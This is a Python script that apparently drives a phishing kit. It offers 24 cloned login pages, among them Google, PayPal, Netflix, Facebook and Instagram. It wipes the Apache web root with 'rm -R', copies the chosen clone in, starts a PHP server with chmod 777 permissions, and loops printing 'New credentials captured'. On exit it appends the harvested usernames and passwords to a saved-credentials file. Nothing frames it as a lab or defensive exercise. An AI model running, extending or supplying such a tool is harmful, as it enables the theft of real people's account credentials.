#!/usr/bin/python3
import os
import time
from signal import signal, SIGINT

sites = {
    "1": "adobe",
    "2": "badoo",
    "3": "devianart",
    "4": "google",
    "5": "instafollowers",
    "6": "instagram",
    "7": "linkedin",
    "8": "messenger",
    "9": "microsoft",
    "10": "myspace",
    "11": "netflix",
    "12": "paypal",
    "13": "pinterest",
    "14": "shopify",
    "15": "spotify",
    "16": "twitch",
    "17": "twitter",
    "18": "snapchat",
    "19": "verizon",
    "20": "wordpress",
    "21": "yahoo",
    "22": "steam",
    "23": "facebook",
    "24": "tcu"
}

print("Website options:")
print("[1]  Adobe               [11] Netflix            [21] Yahoo")
print("[2]  Badoo               [12] PayPal             [22] Steam")
print("[3]  DevianArt           [13] Pinterest          [23] Facebook")
print("[4]  Google              [14] Shopify            [24] TCU")
print("[5]  Instafollowers      [15] Spotify")
print("[6]  Instagram           [16] Twitch")
print("[7]  LinkedIn            [17] Twitter")
print("[8]  Messenger           [18] Snapchat")
print("[9]  Microsoft           [19] Verizon")
print("[10] Myspace             [20] Wordpress")

web_num = input("\nPlease enter a number: ")
website = sites[web_num]

# Copy site resources into the apache2 root directory
print("\nSetting up DocumentRoot for apache...")
os.system("rm -R /var/www/html/*")
os.system("cp -R /phish-server/aws/sites/{}/* /var/www/html/".format(website))
time.sleep(1)

# Start the php server
print("Starting php server...")
os.system("sudo chmod 777 /phish-server/aws/sites/{}".format(website))  # Add permissions for the php files to read and write
os.system("cd /phish-server/aws/sites/{}/ && sudo php -S 127.0.0.1:3333 > /dev/null 2&>1 & sleep 2".format(website))

# Start the web server
print("Starting web server...\n")
os.system("httpd 2> /dev/null")
time.sleep(2)

# Signal handler for CTRL+C
def handler(signal_received, frame):
    if os.path.exists("/var/www/html/usernames.txt"):
        os.system("echo {} >> /phish-server/aws/all-saved-credentials.txt".format(website))
        os.system("cat /var/www/html/usernames.txt >> /phish-server/aws/all-saved-credentials.txt")
        os.system("echo '' >> /phish-server/aws/all-saved-credentials.txt")
    exit(0);

# Add handler for CTRL+C
signal(SIGINT, handler)

# Loop that prints any newly captured credentials
print("Waiting for credentials...")
count = 0
while 1:
    if os.path.exists("/var/www/html/usernames.txt"):
        creds = open("/var/www/html/usernames.txt").read().split("\n")
        if (count < len(creds)):
            if creds[count - 1] != "":
                print("New credentials captured: " + creds[count - 1])
            count += 1
    time.sleep(2)
